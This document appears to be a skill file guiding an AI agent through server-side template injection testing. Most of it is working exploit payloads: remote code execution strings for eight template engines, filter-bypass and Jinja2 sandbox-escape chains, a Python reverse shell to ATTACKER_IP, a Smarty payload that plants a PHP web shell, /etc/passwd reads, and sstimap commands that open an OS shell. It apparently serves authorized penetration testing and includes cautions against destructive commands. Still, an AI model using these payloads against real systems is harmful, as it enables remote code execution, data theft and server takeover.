---
name: ssti
description: Server-Side Template Injection. Use when HauntMode flags SSTI as APPLIES/MAYBE, when user input is reflected in a response in a way suggesting template processing, when testing fields like name/email/subject/custom fields that might render in a template engine, or when you need engine identification, per-engine RCE payloads, and sandbox escape techniques.
---

# SSTI — Server-Side Template Injection

This skill covers detection, engine identification, exploitation (per-engine RCE), sandbox escape, and tooling for all major template engines (Jinja2, Twig, Tornado, Freemarker, Velocity, ERB, Smarty, Mako).

---

## 1. Triggers — when this skill applies

- Any input that is reflected in an HTML response in a "personalized" way — `Hello <name>`, email subjects, error messages, custom fields
- File/page names, profile fields, comment fields, report titles, template names
- Form fields that say things like "customize your message", "enter your display name", "add a description"
- Responses with `.shtml`, `.shtm`, or template engine extension hints (`.j2`, `.twig`, `.erb`, `.ftl`)
- Error messages mentioning Jinja2, Twig, Tornado, Freemarker, Velocity, Smarty, Mako, Pebble, Jade, Handlebars, Nunjucks
- Any field where `{{7*7}}` or `${7*7}` causes the response to change unexpectedly
- Server-generated PDFs, emails, or documents that incorporate user input

**Watch for:** inputs that are used in background processes, emails to admins, or log viewers — these are blind SSTI candidates.

---

---

## 3. 30-second triage

Drop the probe string into every suspect input. Observe whether the response changes or shows a computed value:

```
${{<%[%'"}}%\.
```

This string breaks most template engines because it contains all special characters with semantic meaning. A 500 error or unusual response increases suspicion.

Follow up with targeted detection payloads (look for `49` or `7777777` in the response):

```
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
{{7*'7'}}
<%= 7*7 %>
```

**Skip deep dive if:**
- Input is reflected as plain text with no processing (check: `{{7*7}}` → literally `{{7*7}}` in response)
- Field is numeric-only validated
- Input only appears in a `<meta>` tag or HTTP header without template rendering context

---

## 4. Engine identification decision tree

Follow this logic based on what evaluates to what:

```
START: Try ${7*7}
  └── Evaluated to 49?
      ├── YES → Try #{7*7}
      │         ├── YES → Freemarker or Groovy (Java)
      │         └── NO → Try ${7*7} with EL syntax → likely EL/OGNL
      └── NO → Try {{7*7}}
               ├── NOT evaluated → Try <% = 7*7 %> → if YES → ERB (Ruby)
               └── Evaluated to 49? YES → Try {{7*'7'}}
                   ├── Result is 49 → TWIG (PHP) [49 = arithmetic result]
                   └── Result is 7777777 → JINJA2 (Python) [string repetition]
                       (if neither confirm, try engine-specific payloads below)
```

**Engine-specific confirmation payloads:**

| Engine | Confirmation payload | Expected result |
|---|---|---|
| Twig | `{{_self.env.display("TEST")}}` | Renders "TEST" |
| Jinja2 | `{{config.items()}}` | Dumps Flask config dict |
| Tornado | `{% import os %}{{os.system('whoami')}}` | Returns 0 + RCE |
| Smarty | `{$smarty.version}` | Smarty version string |
| Mako | `${self.__class__}` | Class reference |
| ERB | `<%= system('id') %>` | RCE output |
| Freemarker | `${"freemarker.template.utility.Execute"?new()("id")}` | RCE output |

**Use tplmap/sstimap for automation:**

```bash
[RUN THIS]
python3 /opt/SSTImap/sstimap.py -u "http://TARGET/path?param=test"

# For POST params
python3 /opt/SSTImap/sstimap.py -u "http://TARGET/path" -d "param=test"

# For GET shell
python3 /opt/SSTImap/sstimap.py -u "http://TARGET/path?param=test" --os-shell

# Run single command
python3 /opt/SSTImap/sstimap.py -u "http://TARGET/path?param=test" -S id
```

---

## 5. Detection — minimal payloads per engine context

### 5.1 Universal probe (before engine identification)

```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
```

### 5.2 Blind SSTI

If you can't observe the template evaluation directly (admin emails, logs, PDFs), use time-based detection:

**Jinja2 blind:**
```
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system('sleep 5')}}
```

**Twig blind:**
```
{{['sleep 5']|filter('system')}}
```

---

## 6. Exploitation — per-engine RCE payloads

### 6.1 Jinja2 / Python (Flask, Django)

**Quick RCE — request object shortcut:**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Quick RCE — lipsum shortcut:**
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

**Quick LFI:**
```python
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

**Quick info dump:**
```python
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```

**Full manual RCE chain (when shortcuts are blocked):**

Step 1 — find catch_warnings index (varies by Python version, typically around 214):
```python
{% for i in range(450) %}{{ i }} {{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}{% endfor %}
```

Step 2 — execute command using found index (use actual index, not 214):
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('id').read()}}
```

**Reverse shell:**
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'").read()}}
```

### 6.2 Twig / PHP (Symfony, Drupal)

**RCE via filter:**
```php
{{['id']|filter('system')}}
{{['id']|map('system')}}
```

**RCE via registerUndefinedFilterCallback:**
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

**LFI via Symfony file_excerpt filter:**
```php
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

**Info disclosure:**
```php
{{ _self }}
{{ app.request.server.all|join(',') }}
```

**PHP config/flag read:**
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printenv")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}
```

### 6.3 Tornado / Python

```python
{% import os %}{{os.system('id')}}
{% import os %}{{os.popen('id').read()}}
```

### 6.4 Freemarker / Java

```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### 6.5 Velocity / Java

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### 6.6 ERB / Ruby

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### 6.7 Smarty / PHP

```php
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### 6.8 Mako / Python

```python
${self.__class__.__init__.__globals__['os'].popen('id').read()}
<%
    import os
    x=os.popen('id').read()
%>
${x}
```

---

## 7. Bypass techniques

### 7.1 When `_` (underscore) is filtered

Use `attr()` filter in Jinja2:
```python
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
```

Or use `|attr()` to access dunder methods without underscores in the literal:
```python
{{request|attr("__class__")}}
```

### 7.2 When `[` and `]` are filtered

Use `|attr()` instead of subscript notation.

### 7.3 When strings are filtered

Use `~` concatenation in Jinja2:
```python
{{"o"~"s"|attr("popen")("id")|attr("read")()}}
```

Or character code construction:
```python
{{"".__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}
```

### 7.4 When `{{` and `}}` are filtered (but `{%` is not)

Use statement blocks for side-effect execution:
```python
{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'catch_warnings' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
```

### 7.5 Sandbox escape via subclasses (Jinja2)

Rather than relying on a fixed index for `catch_warnings`, search for it:
```python
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}{% if cls.__name__ == 'catch_warnings' %}{{cls()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
```

---

## 8. False-positive checks

- **Reflection without evaluation** — `{{7*7}}` appears literally as `{{7*7}}` in the response. Not SSTI. The template engine is either not processing user input or is escaping it.
- **Client-side template engine** — Angular, Vue, Handlebars running in the browser. Test with `{{constructor.constructor('alert(1)')()}}` for Angular specifically. Client-side SSTI is a different class.
- **Math expression evaluator** — some apps process `7*7=49` intentionally. Confirm by testing `{{7*7}}` (with curly braces). If `7*7` alone returns 49 but `{{7*7}}` doesn't, it's a calculator feature not SSTI.
- **Server error ≠ SSTI** — a 500 error from `{{7*7}}` could be a WAF or input validation. Confirm by trying a non-math payload that should be benign to the template: `{{''}}`. If that also 500s, it's blocking template syntax regardless.
- **Blind SSTI without confirmation** — don't report blind SSTI without a time-delay or OOB proof. The sleep approach is safest for prod.

---

## 9. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| SSTI in profile field rendered in admin panel | `xss` (if also rendered in browser) | Admin RCE or stored XSS |
| SSTI → RCE → internal network access | `ssrf` | Pivot to internal services |
| SSTI → LFI via template file inclusion | `lfi` | Source code, credential disclosure |
| SSTI in PDF generator → file read | `ssrf` (server-side rendering) | Data exfiltration |
| SSTI with low-privilege app user → privilege escalation | `cmdi` (privesc) | Full server takeover |
| SSTI in email subject → admin-rendered | `xss` (blind-style) | Admin panel compromise |

---

## 10. Reporting template

```
POTENTIAL FINDING: Server-Side Template Injection
Target: <full URL of injection point>
Parameter: <param name + location: query/body/header>
Template engine identified: <Jinja2 | Twig | Tornado | Freemarker | Velocity | ERB | Smarty | Mako | Unknown>
Identification evidence: <e.g. "{{7*'7'}} returned 7777777 confirming Jinja2">
Detection payload:
    {{7*7}} → response contained: 49
Working RCE payload:
    <exact payload>
RCE confirmation:
    <output of id/whoami/hostname commands>
Impact:
    <e.g. "Remote code execution as www-data on the web server" OR
     "Config dump exposing SECRET_KEY and database credentials">
Chain potential: <list other skills/findings combined>
Next step: <e.g. "Develop reverse shell payload" OR "Read /etc/passwd and app config files" OR "Confirm if blind via time-delay">
```

---

## 11. Recon tracker vector strings

Only log if the user explicitly authorizes (see CLAUDE.md "CRITICAL RULE"):

- `ssti:detected:<param>` — template expression evaluated (engine unknown)
- `ssti:engine:<engine>:<param>` — engine confirmed in named param
- `ssti:rce:<engine>` — RCE confirmed via engine
- `ssti:lfi:<engine>` — file read confirmed
- `ssti:blind:<param>` — blind confirmation via time-delay
- `ssti:filter-bypass:<technique>` — non-trivial bypass required
- `ssti:no:<param>` — reflected but not evaluated
- `ssti:chain:<other-vuln>` — SSTI used to reach another vuln class

---

## 12. What NOT to do

- **Do not use `os.system('rm -rf')` or any destructive commands** on production. Stick to `id`, `whoami`, `hostname`, `uname -a` for proof.
- **Do not leave RCE payloads in stored fields** — clean up after testing on shared/production apps.
- **Do not blindly try every engine payload at high speed** — the probe string `${{<%[%'"}}%\.` is enough for initial detection; targeted engine payloads come after the decision tree.
- **Do not report "template expression reflected" as SSTI** without confirming evaluation (i.e., `{{7*7}}` → `49` must appear in the response, not just `{{7*7}}`).
- **Do not skip tplmap/sstimap** for complex apps — manual payloads miss edge cases, especially with custom template implementations.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
